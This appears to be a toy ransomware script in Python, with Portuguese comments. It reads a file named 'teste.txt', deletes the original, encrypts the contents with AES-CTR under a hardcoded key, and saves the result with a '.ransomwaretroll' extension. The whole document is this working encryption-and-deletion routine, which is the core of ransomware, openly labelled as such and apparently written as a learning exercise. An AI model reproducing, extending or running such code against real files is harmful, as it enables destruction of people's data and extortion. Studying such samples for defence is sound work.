import os
from pathlib import Path
import pyaes

# Caminho do arquivo a ser criptografado
file_path = Path("teste.txt")

# Verifica se o arquivo existe
if not file_path.exists():
    raise FileNotFoundError(f"O arquivo {file_path} não foi encontrado.")

# Abre o arquivo e lê os dados
try:
    with open(file_path, "rb") as file:
        file_data = file.read()
except Exception as e:
    raise RuntimeError(f"Erro ao ler o arquivo {file_path}: {e}")

# Remove o arquivo original
try:
    os.remove(file_path)
except Exception as e:
    raise RuntimeError(f"Erro ao remover o arquivo {file_path}: {e}")

# Chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

# Criptografa os dados
try:
    crypto_data = aes.encrypt(file_data)
except Exception as e:
    raise RuntimeError("Erro ao criptografar o arquivo.") from e

# Salva o arquivo criptografado
encrypted_file_path = file_path.with_suffix(file_path.suffix + ".ransomwaretroll")
try:
    with open(encrypted_file_path, "wb") as new_file:
        new_file.write(crypto_data)
except Exception as e:
    raise RuntimeError(f"Erro ao salvar o arquivo criptografado: {e}")

print(f"Arquivo criptografado com sucesso: {encrypted_file_path}")
